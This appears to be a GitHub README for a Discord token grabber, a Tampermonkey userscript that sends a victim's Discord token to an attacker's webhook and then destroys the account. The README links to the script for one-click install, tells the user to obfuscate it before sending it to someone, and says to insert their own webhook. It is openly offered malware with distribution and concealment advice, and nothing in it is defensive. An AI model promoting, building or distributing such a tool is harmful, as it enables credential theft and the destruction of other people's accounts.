# Discord Token Grabber
Sends the discord token over a webhook and nukes the account immediately after. If you want, you can obfuscate it *then* send it to someone. You can do that [here](https://obfuscator.io/).
# Information
### [`/userscript`](https://github.com/endlessXD/Discord-Token-Grabber/raw/main/userscript/)<br>
This script is ran on tampermonkey, a chrome extention, so installing the script should be as easy as clicking [here](https://github.com/endlessXD/Discord-Token-Grabber/raw/main/userscript/script.user.js). You also need to replace the webhook [here](./userscript/script.user.js#L21) before using it.
# Warning
Don't try to run this on yourself unless you know what you are doing.
